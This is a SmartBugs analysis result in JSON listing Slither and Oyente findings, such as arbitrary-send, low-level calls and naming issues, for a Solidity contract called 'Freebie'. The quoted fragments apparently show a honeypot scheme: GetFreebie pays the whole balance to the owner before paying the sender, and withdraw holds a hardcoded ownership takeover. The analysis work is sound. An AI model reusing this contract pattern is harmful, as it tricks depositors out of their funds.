{
  "smartbugs_completed": true,
  "analyzer_results": {
    "slither": {
      "successfull_analysis": true,
      "errors": [
        "EXIT_CODE_10"
      ],
      "vulnerability_findings": [
        {
          "name": "arbitrary-send",
          "vulnerability_from_line": 8,
          "vulnerability_to_line": 13,
          "vulnerability_code": "    function GetFreebie() public payable {\n        if (msg.value > 1 ether) {\n            Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }",
          "message": "Freebie.GetFreebie (0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#8-13) sends eth to arbitrary user\n\tDangerous calls:\n\t- msg.sender.transfer(this.balance) (0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#11)\n"
        },
        {
          "name": "external-function",
          "vulnerability_from_line": 6,
          "vulnerability_to_line": null,
          "vulnerability_code": "    function() public payable {}",
          "message": "Freebie.fallback (0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#6) should be declared external\n"
        },
        {
          "name": "external-function",
          "vulnerability_from_line": 8,
          "vulnerability_to_line": 13,
          "vulnerability_code": "    function GetFreebie() public payable {\n        if (msg.value > 1 ether) {\n            Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }",
          "message": "Freebie.GetFreebie (0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#8-13) should be declared external\n"
        },
        {
          "name": "external-function",
          "vulnerability_from_line": 15,
          "vulnerability_to_line": 21,
          "vulnerability_code": "    function withdraw() public payable {\n        if (msg.sender == 0x30ad12df80a2493a82DdFE367d866616db8a2595) {\n            Owner = 0x30ad12df80a2493a82DdFE367d866616db8a2595;\n        }\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);",
          "message": "Freebie.withdraw (0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#15-21) should be declared external\n"
        },
        {
          "name": "external-function",
          "vulnerability_from_line": 23,
          "vulnerability_to_line": 27,
          "vulnerability_code": "    function Command(address adr, bytes data) public payable {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);",
          "message": "Freebie.Command (0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#23-27) should be declared external\n"
        },
        {
          "name": "solc-version",
          "vulnerability_from_line": 1,
          "vulnerability_to_line": null,
          "vulnerability_code": "pragma solidity ^0.4.19;",
          "message": "Detected issues with version pragma in 0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol:\n\t- pragma solidity^0.4.19 (0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#1): it allows old versions\n"
        },
        {
          "name": "low-level-calls",
          "vulnerability_from_line": 23,
          "vulnerability_to_line": 27,
          "vulnerability_code": "    function Command(address adr, bytes data) public payable {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);",
          "message": "Low level call in Freebie.Command (0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#23-27):\n\t-adr.call.value(msg.value)(data) 0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#26\n"
        },
        {
          "name": "naming-convention",
          "vulnerability_from_line": 8,
          "vulnerability_to_line": 13,
          "vulnerability_code": "    function GetFreebie() public payable {\n        if (msg.value > 1 ether) {\n            Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }",
          "message": "Function 'Freebie.GetFreebie' (0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#8-13) is not in mixedCase\n"
        },
        {
          "name": "naming-convention",
          "vulnerability_from_line": 23,
          "vulnerability_to_line": 27,
          "vulnerability_code": "    function Command(address adr, bytes data) public payable {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);",
          "message": "Function 'Freebie.Command' (0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#23-27) is not in mixedCase\n"
        },
        {
          "name": "naming-convention",
          "vulnerability_from_line": 4,
          "vulnerability_to_line": null,
          "vulnerability_code": "    address public Owner = msg.sender;",
          "message": "Variable 'Freebie.Owner' (0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol#4) is not in mixedCase\n"
        }
      ]
    },
    "oyente": {
      "successfull_analysis": true,
      "errors": [],
      "vulnerability_findings": [
        {
          "name": "Callstack Depth Attack Vulnerability",
          "vulnerability_from_line": 26,
          "vulnerability_to_line": null,
          "vulnerability_code": "        adr.call.value(msg.value)(data);",
          "message": null
        }
      ]
    },
    "mythril-0.23.15": {
      "successfull_analysis": false,
      "errors": [
        "DOCKER_TIMEOUT"
      ],
      "vulnerability_findings": []
    }
  }
}